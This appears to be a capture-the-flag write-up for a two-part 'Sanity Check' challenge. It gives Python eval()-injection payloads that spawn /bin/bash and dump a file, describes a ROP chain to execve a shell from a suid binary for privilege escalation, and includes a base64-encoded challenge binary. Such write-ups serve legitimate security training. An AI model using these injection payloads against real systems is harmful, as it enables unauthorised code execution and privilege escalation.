Sanity Check consists of two challenges.

Part 1: Basic network test / free flag. You netcat to the ip/port and type `cat flag` for the flag.

Part 2: For those that poke more at the "shell" you get dropped into when you connect, they find that any data between parenthesis will be piped directly to `eval()`. From here, most people will spawn a shell (e.g. `(__import__('os').system('/bin/bash'))`) and start poking around.

In the same working directory, there will be a directory named `delete-me-asap` containing a hidden ROP pwnable and flag. The suid binary is statically compiled and contains all the gadgets and functions needed. Constructing the ROP chain to return to `execve("/bin/bash", NULL, NULL)` will return a shell as elevated user.

The provided solution script will perform both stages of the challeges, providing both flags. The only caveat is that it won't let me grab the base64 encoded binary via pwntools. I'm not sure the reason for this, but the following will output the base64 encoded binary that you can copy/paste/decode into the local working dir so that you can load symbols from it.

`(__import__('os').system('base64\x20/bot/delete-me-asap/challenge'))`

```
# (__import__('os').system('base64\x20/bot/delete-me-asap/challenge'))
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAgABAAAAAAABAAAAAAAAAAKgDAAAAAAAAAAAAAEAAOAAB
AEAABQAEAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAQgEAAAAAAABCAQAAAAAAAAAA
IAAAAAAAAAAAAAAAAADoewAAAEiD7CRIvyEBQAAAAAAAvgkAAADoKAAAAEiNfCTovloAAADoLwAA
AEi/KwFAAAAAAAC+EAAAAOgFAAAA6CwAAABIifJIif64AQAAAL8BAAAA6DwAAADDSInySIn+uAAA
AAC/AAAAAOgmAAAAw7g8AAAAvwAAAADoFgAAAEiJ8kiJ/rhpAAAAvwAAAADoAQAAAMMPBcNYw1/D
XsNaw0ZFRUQgTUU6IMNOT00gTk9NIE5PTS4uLgrDL2Jpbi9zaAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAADAAEAgABAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAA
AA8AAAAAAAEAxQBAAAAAAAAAAAAAAAAAABUAAAAAAAEA2wBAAAAAAAAAAAAAAAAAABoAAAAAAAEA
8QBAAAAAAAAAAAAAAAAAAB8AAAAAAAEAAAFAAAAAAAAAAAAAAAAAACUAAAAAAAEAFgFAAAAAAAAA
AAAAAAAAADAAAAAAAAEAGQFAAAAAAAAAAAAAAAAAADgAAAAAAAEAGwFAAAAAAAAAAAAAAAAAAEAA
AAAAAAEAHQFAAAAAAAAAAAAAAAAAAEgAAAAAAAEAHwFAAAAAAAAAAAAAAAAAAFAAAAAAAAEAIQFA
AAAAAAAAAAAAAAAAAFQAAAAAAAEAKwFAAAAAAAAAAAAAAAAAAFgAAAAAAAEAOwFAAAAAAAAAAAAA
AAAAAGMAAAAQAAEAgABAAAAAAAAAAAAAAAAAAF4AAAAQAAEAQgFgAAAAAAAAAAAAAAAAAGoAAAAQ
AAEAQgFgAAAAAAAAAAAAAAAAAHEAAAAQAAEASAFgAAAAAAAAAAAAAAAAAABjaGFsbGVuZ2UuYXNt
AHdyaXRlAHJlYWQAZXhpdABzZXRpZABkb19zeXNjYWxsAHNldF9yYXgAc2V0X3JkaQBzZXRfcnNp
AHNldF9yZHgAYXNrAG5vbQBiaW5zaABfX2Jzc19zdGFydABfZWRhdGEAX2VuZAAALnN5bXRhYgAu
c3RydGFiAC5zaHN0cnRhYgAudGV4dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABgAAAAAAAACAAEAAAAAAAIAA
AAAAAAAAwgAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAA
AAAAAABIAQAAAAAAAMgBAAAAAAAAAwAAAA8AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAA
AAAAAAAAAAAAAAAAEAMAAAAAAAB2AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAAD
AAAAAAAAAAAAAAAAAAAAAAAAAIYDAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAA
AAA=
```

Pasting the above encoded data into a file, decoding it and piping output to `challenge` will allow the `solve.py` exploit to pull symbols from it. Note that `challenge` and `solve.py` need to be in the same working directroy. 

Once `challenge` is pulled, you can simply run `solve.py 1`. It seems that it may need to be run a couple times as it doesn't look as reliable as expected. After verification, I'll try to work the bugs out of `solve.py` (without modifying other stuff).
